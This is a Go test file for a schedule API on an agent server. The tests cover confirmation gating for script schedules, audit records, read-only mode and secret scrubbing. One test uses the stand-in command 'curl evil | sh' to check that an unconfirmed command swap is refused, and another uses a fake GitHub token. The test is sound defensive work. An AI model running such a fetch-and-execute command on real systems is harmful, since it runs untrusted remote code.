package server

import (
	"encoding/json"
	"net/http"
	"net/http/httptest"
	"strings"
	"sync"
	"testing"
	"time"

	"github.com/jonathanung/strike/internal/schedule"
	"github.com/jonathanung/strike/internal/trust/audit"
)

// scriptAuditor captures script_run records written by the handlers.
type scriptAuditor struct {
	mu   sync.Mutex
	recs []audit.ScriptRunPayload
	fams []string
}

func (a *scriptAuditor) Record(family, sessionID, turnID, toolCallID, chainID string, payload any) error {
	a.mu.Lock()
	defer a.mu.Unlock()
	a.fams = append(a.fams, family)
	if p, ok := payload.(audit.ScriptRunPayload); ok {
		a.recs = append(a.recs, p)
	}
	return nil
}

func (a *scriptAuditor) take() []audit.ScriptRunPayload {
	a.mu.Lock()
	defer a.mu.Unlock()
	out := a.recs
	a.recs, a.fams = nil, nil
	return out
}

func newScriptScheduleServer(t *testing.T, dir string, readOnly bool, aud OpAuditor) (*Server, *schedule.Service) {
	t.Helper()
	now := time.Date(2026, 11, 14, 8, 0, 0, 0, time.UTC)
	svc, err := schedule.Open(dir, schedule.Hooks{Now: func() time.Time { return now }}, t.TempDir())
	if err != nil {
		t.Fatal(err)
	}
	srv, err := New(Options{SessionDir: t.TempDir(), Schedules: svc, ReadOnly: readOnly, Audit: aud})
	if err != nil {
		t.Fatal(err)
	}
	return srv, svc
}

func doSchedule(t *testing.T, srv *Server, method, path, body string) *httptest.ResponseRecorder {
	t.Helper()
	var req *http.Request
	if body == "" {
		req = httptest.NewRequest(method, path, nil)
	} else {
		req = httptest.NewRequest(method, path, strings.NewReader(body))
	}
	rec := httptest.NewRecorder()
	srv.Handler().ServeHTTP(rec, req)
	return rec
}

const scriptBody = `{"name":"Nightly","kind":"interval","every":"1h","source":"script","command":"make test","timeout":"5m"%s}`

func TestScheduleScriptCreateRequiresConfirm(t *testing.T) {
	aud := &scriptAuditor{}
	srv, svc := newScriptScheduleServer(t, t.TempDir(), false, aud)

	for _, extra := range []string{"", `,"confirm":false`} {
		rec := doSchedule(t, srv, http.MethodPost, "/v1/schedules", strings.Replace(scriptBody, "%s", extra, 1))
		if rec.Code != http.StatusBadRequest || !strings.Contains(rec.Body.String(), "confirm required") {
			t.Fatalf("no confirm (%q): %d %s", extra, rec.Code, rec.Body.String())
		}
	}
	// Source match is case-insensitive: SCRIPT is still gated.
	rec := doSchedule(t, srv, http.MethodPost, "/v1/schedules", `{"name":"x","kind":"interval","every":"1h","source":" SCRIPT ","command":"true"}`)
	if rec.Code != http.StatusBadRequest || !strings.Contains(rec.Body.String(), "confirm required") {
		t.Fatalf("upper-case source: %d %s", rec.Code, rec.Body.String())
	}
	// The client can never supply the arming stamp or hash.
	for _, field := range []string{`,"confirm":true,"armedAt":"2026-01-01T00:00:00Z"`, `,"confirm":true,"commandHash":"abc"`} {
		rec := doSchedule(t, srv, http.MethodPost, "/v1/schedules", strings.Replace(scriptBody, "%s", field, 1))
		if rec.Code != http.StatusBadRequest {
			t.Fatalf("client-supplied arming %q: %d %s", field, rec.Code, rec.Body.String())
		}
	}
	if n := len(svc.List()); n != 0 {
		t.Fatalf("stored %d schedules without confirm", n)
	}
	if recs := aud.take(); len(recs) != 0 {
		t.Fatalf("audit on refused create: %+v", recs)
	}

	rec = doSchedule(t, srv, http.MethodPost, "/v1/schedules", strings.Replace(scriptBody, "%s", `,"confirm":true`, 1))
	if rec.Code != http.StatusCreated {
		t.Fatalf("confirmed create %d %s", rec.Code, rec.Body.String())
	}
	var dto scheduleDTO
	if err := json.Unmarshal(rec.Body.Bytes(), &dto); err != nil {
		t.Fatal(err)
	}
	if dto.Source != schedule.SourceScript || dto.Command != "make test" || dto.Timeout != "5m" {
		t.Fatalf("dto %+v", dto)
	}
	if dto.ArmedAt == "" || dto.CommandHash != schedule.HashCommand("make test") {
		t.Fatalf("arming not stamped: armedAt=%q hash=%q", dto.ArmedAt, dto.CommandHash)
	}
	stored, ok := svc.Get(dto.ID)
	if !ok || stored.ArmedAt.IsZero() || stored.CommandHash != dto.CommandHash {
		t.Fatalf("stored %+v", stored)
	}
	recs := aud.take()
	if len(recs) != 1 {
		t.Fatalf("want exactly one lifecycle record, got %+v", recs)
	}
	got := recs[0]
	if got.Status != "armed" || got.ScheduleID != dto.ID || got.Command != "make test" ||
		got.CommandHash != dto.CommandHash || got.ClientIP != "192.0.2.1" || got.RunID != "" {
		t.Fatalf("armed record %+v", got)
	}
}

func TestScheduleScriptPatchGateAndNoConversion(t *testing.T) {
	aud := &scriptAuditor{}
	srv, svc := newScriptScheduleServer(t, t.TempDir(), false, aud)

	rec := doSchedule(t, srv, http.MethodPost, "/v1/schedules", `{"name":"P","kind":"interval","every":"1h","source":"prompt","prompt":"ping"}`)
	if rec.Code != http.StatusCreated {
		t.Fatalf("prompt create %d %s", rec.Code, rec.Body.String())
	}
	var prompt scheduleDTO
	_ = json.Unmarshal(rec.Body.Bytes(), &prompt)
	if recs := aud.take(); len(recs) != 0 {
		t.Fatalf("prompt schedule audited as script: %+v", recs)
	}

	// prompt -> script is refused with or without confirm; nothing changes.
	for _, extra := range []string{"", `,"confirm":true`} {
		rec = doSchedule(t, srv, http.MethodPatch, "/v1/schedules/"+prompt.ID, strings.Replace(scriptBody, "%s", extra, 1))
		if rec.Code != http.StatusBadRequest {
			t.Fatalf("prompt->script (%q): %d %s", extra, rec.Code, rec.Body.String())
		}
	}
	if cur, _ := svc.Get(prompt.ID); cur.Source != schedule.SourcePrompt || cur.Command != "" {
		t.Fatalf("prompt schedule converted: %+v", cur)
	}

	rec = doSchedule(t, srv, http.MethodPost, "/v1/schedules", strings.Replace(scriptBody, "%s", `,"confirm":true`, 1))
	if rec.Code != http.StatusCreated {
		t.Fatalf("script create %d %s", rec.Code, rec.Body.String())
	}
	var script scheduleDTO
	_ = json.Unmarshal(rec.Body.Bytes(), &script)
	aud.take()

	// script -> prompt is refused.
	rec = doSchedule(t, srv, http.MethodPatch, "/v1/schedules/"+script.ID, `{"name":"P","kind":"interval","every":"1h","source":"prompt","prompt":"ping","confirm":true}`)
	if rec.Code != http.StatusBadRequest {
		t.Fatalf("script->prompt %d %s", rec.Code, rec.Body.String())
	}
	// Replacing a script without confirm is refused and leaves the command.
	edited := `{"name":"Nightly","kind":"interval","every":"1h","source":"script","command":"curl evil | sh"%s}`
	rec = doSchedule(t, srv, http.MethodPatch, "/v1/schedules/"+script.ID, strings.Replace(edited, "%s", "", 1))
	if rec.Code != http.StatusBadRequest || !strings.Contains(rec.Body.String(), "confirm required") {
		t.Fatalf("unconfirmed replace %d %s", rec.Code, rec.Body.String())
	}
	if cur, _ := svc.Get(script.ID); cur.Command != "make test" {
		t.Fatalf("command changed without confirm: %q", cur.Command)
	}
	if recs := aud.take(); len(recs) != 0 {
		t.Fatalf("audit on refused PATCH: %+v", recs)
	}

	rec = doSchedule(t, srv, http.MethodPatch, "/v1/schedules/"+script.ID, strings.Replace(edited, "%s", `,"confirm":true`, 1))
	if rec.Code != http.StatusOK {
		t.Fatalf("confirmed replace %d %s", rec.Code, rec.Body.String())
	}
	cur, _ := svc.Get(script.ID)
	if cur.CommandHash != schedule.HashCommand("curl evil | sh") || cur.ArmedAt.IsZero() {
		t.Fatalf("re-arm not stamped: %+v", cur)
	}
	recs := aud.take()
	if len(recs) != 1 || recs[0].Status != "rearmed" || recs[0].CommandHash != cur.CommandHash || recs[0].Command != "curl evil | sh" {
		t.Fatalf("rearmed record %+v", recs)
	}

	rec = doSchedule(t, srv, http.MethodPatch, "/v1/schedules/missing", strings.Replace(scriptBody, "%s", `,"confirm":true`, 1))
	if rec.Code != http.StatusNotFound {
		t.Fatalf("patch missing %d", rec.Code)
	}
}

func TestScheduleScriptLifecycleAuditOnePerHandler(t *testing.T) {
	aud := &scriptAuditor{}
	srv, _ := newScriptScheduleServer(t, t.TempDir(), false, aud)

	rec := doSchedule(t, srv, http.MethodPost, "/v1/schedules", strings.Replace(scriptBody, "%s", `,"confirm":true`, 1))
	if rec.Code != http.StatusCreated {
		t.Fatalf("create %d %s", rec.Code, rec.Body.String())
	}
	var script scheduleDTO
	_ = json.Unmarshal(rec.Body.Bytes(), &script)
	aud.take()
	hash := schedule.HashCommand("make test")

	for _, step := range []struct {
		method, path, status string
	}{
		{http.MethodPost, "/v1/schedules/" + script.ID + "/pause", "paused"},
		{http.MethodPost, "/v1/schedules/" + script.ID + "/resume", "resumed"},
		{http.MethodDelete, "/v1/schedules/" + script.ID, "deleted"},
	} {
		rec := doSchedule(t, srv, step.method, step.path, "")
		if rec.Code != http.StatusOK {
			t.Fatalf("%s %s: %d %s", step.method, step.path, rec.Code, rec.Body.String())
		}
		recs := aud.take()
		if len(recs) != 1 {
			t.Fatalf("%s: want one record, got %+v", step.status, recs)
		}
		if r := recs[0]; r.Status != step.status || r.ScheduleID != script.ID || r.CommandHash != hash ||
			r.Command != "make test" || r.ClientIP == "" {
			t.Fatalf("%s record %+v", step.status, r)
		}
	}

	// Failed lifecycle calls and session schedules write nothing.
	if rec := doSchedule(t, srv, http.MethodDelete, "/v1/schedules/"+script.ID, ""); rec.Code != http.StatusNotFound {
		t.Fatalf("second delete %d", rec.Code)
	}
	rec = doSchedule(t, srv, http.MethodPost, "/v1/schedules", `{"name":"P","kind":"interval","every":"1h","source":"prompt","prompt":"ping"}`)
	var prompt scheduleDTO
	_ = json.Unmarshal(rec.Body.Bytes(), &prompt)
	doSchedule(t, srv, http.MethodPost, "/v1/schedules/"+prompt.ID+"/pause", "")
	doSchedule(t, srv, http.MethodPost, "/v1/schedules/"+prompt.ID+"/resume", "")
	doSchedule(t, srv, http.MethodDelete, "/v1/schedules/"+prompt.ID, "")
	if recs := aud.take(); len(recs) != 0 {
		t.Fatalf("non-script lifecycle audited: %+v", recs)
	}
}

func TestScheduleScriptReadOnlyRejectsWrites(t *testing.T) {
	aud := &scriptAuditor{}
	srv, svc := newScriptScheduleServer(t, t.TempDir(), true, aud)
	rec := doSchedule(t, srv, http.MethodPost, "/v1/schedules", strings.Replace(scriptBody, "%s", `,"confirm":true`, 1))
	if rec.Code != http.StatusForbidden {
		t.Fatalf("read-only create %d %s", rec.Code, rec.Body.String())
	}
	if len(svc.List()) != 0 || len(aud.take()) != 0 {
		t.Fatal("read-only server stored or audited a script schedule")
	}
}

// seedScriptRuns writes a script schedule with two runs (one with a
// sidecar) straight into the store, before the service opens it.
func seedScriptRuns(t *testing.T, dir string) (schID, withOutput, without string) {
	t.Helper()
	st, err := schedule.OpenStore(dir)
	if err != nil {
		t.Fatal(err)
	}
	now := time.Date(2026, 11, 14, 7, 0, 0, 0, time.UTC)
	code := 3
	sch := schedule.Schedule{
		ID: "sch_script", Name: "Nightly", Enabled: true, Kind: schedule.KindInterval, Every: "1h",
		Timezone: "UTC", Source: schedule.SourceScript, Command: "make test", Timeout: "30m",
		ArmedAt: now, CommandHash: schedule.HashCommand("make test"),
		Overlap: schedule.OverlapSkip, Missed: "skip", CreatedAt: now, UpdatedAt: now,
		Runs: []schedule.Run{
			{
				ID: "run_out", ScheduleID: "sch_script", FiredAt: now, Status: schedule.StatusFailed,
				StartedAt: now, EndedAt: now.Add(time.Minute), ExitCode: &code,
				OutputPreview: "FAIL tail", OutputRef: "run_out", Decision: schedule.DecisionArmed,
			},
			{ID: "run_none", ScheduleID: "sch_script", FiredAt: now, Status: schedule.StatusDenied, Decision: schedule.DecisionDeny},
		},
	}
	if err := st.Insert(sch); err != nil {
		t.Fatal(err)
	}
	if _, err := st.WriteRunOutput(sch.ID, "run_out", []byte("line 1\nFAIL tail\n")); err != nil {
		t.Fatal(err)
	}
	return sch.ID, "run_out", "run_none"
}

func TestScheduleScriptRunOutputRoute(t *testing.T) {
	for _, readOnly := range []bool{false, true} {
		dir := t.TempDir()
		schID, withOut, without := seedScriptRuns(t, dir)
		srv, _ := newScriptScheduleServer(t, dir, readOnly, nil)

		rec := doSchedule(t, srv, http.MethodGet, "/v1/schedules/"+schID+"/runs/"+withOut+"/output", "")
		if rec.Code != http.StatusOK {
			t.Fatalf("readOnly=%v output %d %s", readOnly, rec.Code, rec.Body.String())
		}
		if ct := rec.Header().Get("Content-Type"); !strings.HasPrefix(ct, "text/plain") {
			t.Fatalf("content-type %q", ct)
		}
		if rec.Body.String() != "line 1\nFAIL tail\n" {
			t.Fatalf("body %q", rec.Body.String())
		}
		for _, path := range []string{
			"/v1/schedules/" + schID + "/runs/" + without + "/output",
			"/v1/schedules/" + schID + "/runs/run_missing/output",
			"/v1/schedules/sch_missing/runs/" + withOut + "/output",
		} {
			if rec := doSchedule(t, srv, http.MethodGet, path, ""); rec.Code != http.StatusNotFound {
				t.Fatalf("readOnly=%v %s: %d %s", readOnly, path, rec.Code, rec.Body.String())
			}
		}
	}
}

func TestScheduleScriptHistoryRunFields(t *testing.T) {
	dir := t.TempDir()
	schID, withOut, _ := seedScriptRuns(t, dir)
	srv, _ := newScriptScheduleServer(t, dir, true, nil)
	rec := doSchedule(t, srv, http.MethodGet, "/v1/schedules/"+schID+"/history", "")
	if rec.Code != http.StatusOK {
		t.Fatalf("history %d %s", rec.Code, rec.Body.String())
	}
	var body struct {
		Runs []runDTO `json:"runs"`
	}
	if err := json.Unmarshal(rec.Body.Bytes(), &body); err != nil {
		t.Fatal(err)
	}
	var run *runDTO
	for i := range body.Runs {
		if body.Runs[i].ID == withOut {
			run = &body.Runs[i]
		}
	}
	if run == nil || run.ExitCode == nil || *run.ExitCode != 3 || run.StartedAt == "" || run.EndedAt == "" ||
		run.OutputPreview != "FAIL tail" || run.OutputRef != withOut || run.Decision != schedule.DecisionArmed ||
		run.Status != schedule.StatusFailed {
		t.Fatalf("run dto %+v", run)
	}

	rec = doSchedule(t, srv, http.MethodGet, "/v1/schedules/"+schID, "")
	var dto scheduleDTO
	if err := json.Unmarshal(rec.Body.Bytes(), &dto); err != nil {
		t.Fatal(err)
	}
	if dto.Command != "make test" || dto.Timeout != "30m" || dto.ArmedAt == "" || dto.CommandHash != schedule.HashCommand("make test") {
		t.Fatalf("schedule dto %+v", dto)
	}
}

func TestScheduleScriptCommandScrubbedOnRead(t *testing.T) {
	srv, _ := newScriptScheduleServer(t, t.TempDir(), false, nil)
	const secret = "ghp_" + "abcdefghijklmnopqrstuvwxyz0123456789"
	body := `{"name":"Push","kind":"interval","every":"1h","source":"script","command":"GITHUB_TOKEN=` + secret + ` git push","confirm":true}`
	rec := doSchedule(t, srv, http.MethodPost, "/v1/schedules", body)
	if rec.Code != http.StatusCreated {
		t.Fatalf("create %d %s", rec.Code, rec.Body.String())
	}
	if strings.Contains(rec.Body.String(), secret) {
		t.Fatalf("secret in create response: %s", rec.Body.String())
	}
	list := doSchedule(t, srv, http.MethodGet, "/v1/schedules", "")
	if strings.Contains(list.Body.String(), secret) {
		t.Fatalf("secret in list: %s", list.Body.String())
	}
}

// A script schedule never opens an agent session, whatever the fire path
// does with it: POST /run must not reach the root starter.
func TestScheduleScriptRunNowNeverStartsSession(t *testing.T) {
	start := &recordingStarter{id: "sess-should-not-exist"}
	svc, err := schedule.Open(t.TempDir(), schedule.Hooks{Starter: start}, t.TempDir())
	if err != nil {
		t.Fatal(err)
	}
	srv, err := New(Options{SessionDir: t.TempDir(), Schedules: svc})
	if err != nil {
		t.Fatal(err)
	}
	rec := doSchedule(t, srv, http.MethodPost, "/v1/schedules", strings.Replace(scriptBody, "%s", `,"confirm":true`, 1))
	if rec.Code != http.StatusCreated {
		t.Fatalf("create %d %s", rec.Code, rec.Body.String())
	}
	var script scheduleDTO
	_ = json.Unmarshal(rec.Body.Bytes(), &script)
	rec = doSchedule(t, srv, http.MethodPost, "/v1/schedules/"+script.ID+"/run", "")
	if len(start.reqs) != 0 {
		t.Fatalf("script run started an agent session: %+v (status %d %s)", start.reqs, rec.Code, rec.Body.String())
	}
	if strings.Contains(rec.Body.String(), "sess-should-not-exist") {
		t.Fatalf("run carries a session id: %s", rec.Body.String())
	}
}
